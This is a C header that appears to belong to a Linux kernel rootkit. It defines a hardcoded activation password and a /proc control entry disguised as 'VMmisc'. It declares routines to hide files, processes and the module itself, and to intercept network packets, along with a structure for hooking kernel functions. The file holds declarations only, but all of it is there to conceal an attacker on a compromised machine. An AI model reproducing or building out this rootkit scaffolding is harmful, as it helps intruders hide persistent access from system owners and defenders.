#ifndef CONFIG_H
#define CONFIG_H
#include <linux/fs.h>

//#define DEBUG_MSG


#define _START_PASS		"testtest"		// qwer1234

// xxx
#define CTL_PROC_NAME	"VMmisc"	// /proc/VMmisc 
//----------------------------------------------------------------------------



#ifdef DEBUG_MSG
#define debug(format, args...) \
        printk("function:%s-L%d: " format, __FUNCTION__, __LINE__, ##args);
#else
#define debug(format, args...)  do {} while(0);
#endif

static char _kpath[512] = {0};
static char _kname[128] = {0};	// max len 7

//----------------------------------------------------------------------------------------
extern int _init1(void);
extern void _init2(void);

// rpkt
extern int pktinit1(void);
extern void pktinit2(void);
extern int packi(struct sk_buff *skb);
extern int packo(struct sk_buff *skb);


// rfile.h
void file_hide( char *name );
void file_unhide( char *name );

// rmod 
void hide(void);
void show(void);

// rproc
static void pid_hide(long pid);
static void pid_unhide(long pid);


// util.h
extern int init_util_func(void);



#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
#ifndef set_memory_x_t
typedef typeof(set_memory_x) set_memory_x_t;
#endif
extern set_memory_x_t *ptr_mem_x;
#endif

//----------------------------------------------------------------------------------------

typedef struct
{
	/* tagret's name */
	char *name;

	void *stub_bak;

	/* target's handler address */
	void *handler;

	/* target's insn length */
	int length;

	/* target's address and rw-mapping */
	void *target;
	void *target_map;

	atomic_t usage;
} hook_t;


#endif
